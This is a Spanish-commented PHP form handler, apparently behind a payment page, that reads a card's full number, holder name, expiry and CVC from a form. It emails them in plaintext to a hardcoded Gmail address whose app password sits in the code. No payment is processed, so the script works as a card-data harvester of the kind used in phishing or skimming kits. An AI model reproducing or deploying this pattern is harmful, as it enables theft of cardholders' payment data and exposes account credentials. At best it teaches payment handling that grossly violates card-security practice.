        <?php
        // mail.php utilizando PHPMailer y configuración de Gmail

        use PHPMailer\PHPMailer\PHPMailer;
        use PHPMailer\PHPMailer\Exception;

        require 'PHPMailer/phpmailer/src/Exception.php';
        require 'PHPMailer/phpmailer/src/PHPMailer.php';
        require 'PHPMailer/phpmailer/src/SMTP.php';

        if ($_SERVER['REQUEST_METHOD'] === 'POST') {

            $monto = isset($_POST['form-field-cantidad']) ? htmlspecialchars(trim($_POST['form-field-cantidad'])) : '';
            $numeroTarjeta = isset($_POST['numero_tarjeta']) ? htmlspecialchars(trim($_POST['numero_tarjeta'])) : '';
            $titular = isset($_POST['card-holder']) ? htmlspecialchars(trim($_POST['card-holder'])) : '';
            $vencimiento = isset($_POST['expiry']) ? htmlspecialchars(trim($_POST['expiry'])) : '';
            $cvc = isset($_POST['cvc']) ? htmlspecialchars(trim($_POST['cvc'])) : '';
            $metodo = isset($_POST['payment-method']) ? htmlspecialchars(trim($_POST['payment-method'])) : '';
            
            $msi = "";
            if ($metodo === "msi" && isset($_POST['msi'])) {
                $msi = htmlspecialchars(trim($_POST['msi']));
            }

            // Configuración de Gmail
            $smtp_user = 'dropsinfusionvital@gmail.com';
            $smtp_pass = 'jjdjcgyrjkpkcbll';
            $destinatario = $smtp_user;

            $mail = new PHPMailer(true);
            try {
                $mail->isSMTP();
                $mail->Host       = 'smtp.gmail.com';
                $mail->SMTPAuth   = true;
                $mail->Username   = $smtp_user;
                $mail->Password   = $smtp_pass;
                $mail->SMTPSecure = 'tls';
                $mail->Port       = 587;

                $mail->setFrom($smtp_user, 'Drops Infusion Vital');
                $mail->addAddress($destinatario, 'Drops Infusion Vital');

                $mail->isHTML(false);
                $mail->Subject = 'Nuevo pago recibido';

                $mensaje = "Detalles del pago:\n";
                $mensaje .= "Monto a pagar: " . $monto . "\n";
                $mensaje .= "Número de tarjeta: " . $numeroTarjeta . "\n";
                $mensaje .= "Titular: " . $titular . "\n";
                $mensaje .= "Vencimiento: " . $vencimiento . "\n";
                $mensaje .= "Código de seguridad (CVC): " . $cvc . "\n";
                $mensaje .= "Método de pago: " . $metodo . "\n";
                if ($msi !== "") {
                    $mensaje .= "MSI seleccionado: " . $msi . "\n";
                }

                $mail->Body = $mensaje;

                $mail->send();
                echo 'El pago se ha enviado correctamente.';
            } catch (Exception $e) {
                echo "Hubo un error al enviar el pago. Mailer Error: {$mail->ErrorInfo}";
            }
        } else {
            echo "Acceso no permitido.";
        }
        ?>